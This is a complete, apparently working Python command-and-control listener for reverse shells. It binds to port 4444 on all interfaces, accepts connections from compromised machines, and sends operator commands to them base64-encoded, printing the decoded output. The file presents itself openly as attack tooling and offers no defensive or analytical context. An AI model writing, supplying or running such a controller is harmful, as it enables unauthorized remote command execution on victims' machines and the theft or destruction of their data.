#!/usr/bin/env python3
# C2 Listener for reverse shell

import socket
import base64
import threading
import subprocess

def handle_shell(client_sock):
    """Handle incoming shell"""
    while True:
        cmd = input("shell> ")
        if cmd.lower() in ['exit', 'quit']:
            client_sock.send(base64.b64encode(b'exit').decode().encode())
            break
        
        client_sock.send(base64.b64encode(cmd.encode()))
        
        # Receive output
        data = b''
        while True:
            chunk = client_sock.recv(4096)
            data += chunk
            if b'\n' in data:
                break
        
        output = base64.b64decode(data.decode().split('\n')[0]).decode()
        print(output)

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 4444))
    s.listen(10)
    print("[+] Listener on 0.0.0.0:4444")
    
    while True:
        client, addr = s.accept()
        print(f"[+] Connection from {addr}")
        threading.Thread(target=handle_shell, args=(client,)).start()

if __name__ == "__main__":
    main()
